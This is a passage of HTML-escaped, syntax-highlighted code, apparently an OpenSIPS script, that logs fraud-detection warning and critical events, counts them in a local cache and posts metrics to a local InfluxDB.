&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;E_FRD_WARNING: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(param);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(val);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(thr);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(user);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(number);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ruleid)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;calls per minute&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cpm++!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cpm&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;call_duration&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cdur++!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cdur&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;total calls&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_tc++!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_tc&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;concurrent calls&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cc++!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cc&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sequential calls&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_seq++!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_seq&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;event_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;E_FRD_CRITICAL&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	fetch_event_params&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(param);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(val);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(thr);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(user);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(number);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ruleid)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;E_FRD_CRITICAL: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(param);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(val);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(thr);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(user);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(number);&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(ruleid)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;calls per minute&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcpm++\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcpm&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;call_duration&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcdur++\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcdur&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;total calls&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_crittc++!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_crittc&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;concurrent calls&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcc++!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcc&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;param&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sequential calls&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critseq++!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critseq&amp;#34;&lt;/span&gt;, 1, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;store_influxdb&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $param&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,host=&amp;#34;&lt;/span&gt; + $param&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; + &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; value=&amp;#34;&lt;/span&gt; + $param&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;XXX posting: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(body) (&lt;/span&gt;$param&lt;span style=&#34;color:#e6db74&#34;&gt;(1) / &lt;/span&gt;$param&lt;span style=&#34;color:#e6db74&#34;&gt;(2) / &lt;/span&gt;$param&lt;span style=&#34;color:#e6db74&#34;&gt;(4))\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!rest_post&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://localhost:8086/write?db=&lt;/span&gt;$param&lt;span style=&#34;color:#e6db74&#34;&gt;(1)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(body)&amp;#34;&lt;/span&gt;, , &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(body)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ERR in rest_post!\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;timer_route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;dump_fraud_cpm, 1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cpm&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ccpm&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cpm&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cpm&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_counter_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcpm&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ccpm&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_cpm&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	cache_remove&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e_frd_critcpm&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
